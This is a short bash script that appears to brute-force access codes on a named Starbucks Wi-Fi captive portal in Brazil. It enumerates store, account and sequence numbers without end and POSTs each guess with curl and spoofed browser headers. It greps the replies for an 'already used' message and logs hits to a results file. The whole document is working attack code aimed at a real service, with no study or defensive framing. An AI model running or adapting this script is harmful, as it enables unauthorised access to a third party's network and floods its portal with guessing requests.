COUNT=1
INCREMENT=1
STORE_NUMBER=$1
ACCOUNT_NR=$2
while [ 1 ]
do
  echo "----------------------------------------------------------------------"

  if [ $ACCOUNT_NR -lt 10 ] 
  then 
    ACCOUNT_NR_STR=000$ACCOUNT_NR
  elif [ $ACCOUNT_NR -lt 100 ] 
  then 
    ACCOUNT_NR_STR=00$ACCOUNT_NR
  elif [ $ACCOUNT_NR -lt 1000 ] 
  then 
    ACCOUNT_NR_STR=0$ACCOUNT_NR
  else
    ACCOUNT_NR_STR=$ACCOUNT_NR
  fi;

  if [ $COUNT -lt 10 ]
  then
    SEQ_NR=0$COUNT
  else
    SEQ_NR=$COUNT
  fi;

  BODY="new_code=$STORE_NUMBER+$ACCOUNT_NR_STR+$SEQ_NR"
  echo $BODY

  curl 'https://portal.linktelwifi.com.br/user/starbucks/new-code' -H 'Pragma: no-cache' -H 'Origin: https://portal.linktelwifi.com.br' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.168 Safari/537.36 OPR/51.0.2830.40' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Referer: https://portal.linktelwifi.com.br/user/starbucks/new-code' -H 'Connection: keep-alive' --data "$BODY" --compressed -sv --post302 2>&1 | less > result.txt
  echo "* * * * *"
  cat result.txt | grep 'text-info' > grepResult.txt
  cat result.txt | grep 'Está senha já foi utilizada' > grepResultUtilizada.txt
  if [ -s grepResultUtilizada.txt ]
  then
    echo "$STORE_NUMBER $ACCOUNT_NR_STR $SEQ_NR" >> results.txt
  elif [ -s grepResult.txt ]
  then
    cat grepResult.txt
  else
    #cat result.txt
    #exit 0
    echo "$STORE_NUMBER $ACCOUNT_NR_STR $SEQ_NR" >> results.txt
  fi
  COUNT=$(($COUNT+$INCREMENT))

  if [ $COUNT -gt 99 ]
  then
    COUNT=1
    ACCOUNT_NR=$(($ACCOUNT_NR+$INCREMENT))
  fi
done

